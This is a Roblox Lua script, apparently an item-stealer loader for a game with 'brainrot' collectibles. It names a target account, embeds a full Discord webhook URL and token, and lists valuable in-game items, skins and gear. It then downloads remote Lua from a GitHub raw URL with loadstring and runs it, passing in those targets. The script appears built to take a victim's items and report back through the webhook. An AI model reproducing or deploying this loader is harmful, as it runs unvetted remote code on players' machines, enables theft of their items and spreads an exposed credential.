local TARGET_ID = 10479113416
local TARGET_USER = "Adalet11145"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1547285203700023348/T8KwKM_uyany2bilTsYReFRaA5mrctFvgGhHB00UvDdHTGfZzUybRxbnnYf2d9wQVEvj"

local TargetBrainrots = {
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Dragon Gingerini"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rico Dinero"] = true,
    ["Rubrikiko"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Foxini Lanternini"] = true,
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Orchidox"] = true,
    ["Los Dragons"] = true,
    ["La Craft Machine"] = true,
    ["Gold and Diamond"] = true,
    ["John Pork"] = true,
    ["Capitano Americano"] = true,
    ["Headless Horseman"] = true,
    ["Money Money Bros"] = true,
    ["Rhino Helicopterino"] = true,
    ["Steakini Fattini"] = true,
    ["Sammyni Cakini"] = true,
    ["Los Hackers"] = true,
    ["John Doe"] = true,
    ["Jelly Moby"] = true,
    ["Centrucci Nuclucci"] = true,
    ["Ginger Cisterna"] = true,
    ["Digi Narwhal"] = true,
    ["Bearito Cabinito"] = true,
    ["Los Admins"] = true,
    ["Moby Bros"] = true,
    ["Boppin Bunny"] = true,
    ["Bunny and Eggy"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Celestial Pegasus"] = true,
    ["Cash or Card"] = true,
    ["Cloverat Clapat"] = true,
    ["Cooki and Milki"] = true
}

local TargetBaseSkins = {
    ["Tralalero"] = true,
    ["Octo"] = true
}

local TargetGears = {
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Rainbow Hammer"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Santa's Sleigh"] = true,
    ["Skeleton Dragon"] = true,
    ["Candy Sentry"] = true,
    ["Blackhole Bomb"] = true
}

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)